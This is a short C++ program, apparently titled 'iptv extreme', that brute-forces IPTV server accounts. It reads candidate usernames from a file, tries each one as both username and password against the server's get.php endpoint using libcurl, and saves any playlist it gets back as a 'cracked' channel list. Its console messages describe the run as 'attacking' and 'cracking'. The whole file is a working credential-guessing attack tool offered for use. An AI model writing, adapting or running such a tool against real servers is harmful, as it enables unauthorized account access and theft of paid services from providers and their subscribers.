#include <iostream>
#include <string>
#include <curl/curl.h>
#include <fstream>

using namespace std;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void attack(string server) {
    string line;
    ifstream infile("names.txt");
    
    while(getline(infile, line)) {
        CURL *curl;
        CURLcode res;
        string readBuffer;
        string filename;
        string url;
        
        curl = curl_easy_init();
        if(curl) {
            url = string(server)+"/get.php?username="+line+"&password="+line+"&type=m3u&output=mpegts";
            filename = string("output/tv_channels_")+line+".m3u";
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
            res = curl_easy_perform(curl);
            
            if(readBuffer.size()>0) {
                ofstream out(filename);
                out << readBuffer;
                out.close();
            }
            curl_easy_cleanup(curl);
            
        }
    }
}

int main() {
    string server;
    
    cout << "-- iptv extreme --" << endl;
    cout << "coded by: @Arm4x" << endl;
    cout << "server url: ";
    cin >> server;
    cout << endl;
    cout << "[i] no output is showed for faster cracking, just wait until exit" << endl;
    cout << "[i] you will see cracked channel in the output directory" << endl;
    cout << "attacking..." << endl;
    attack(server);
    return 0;
}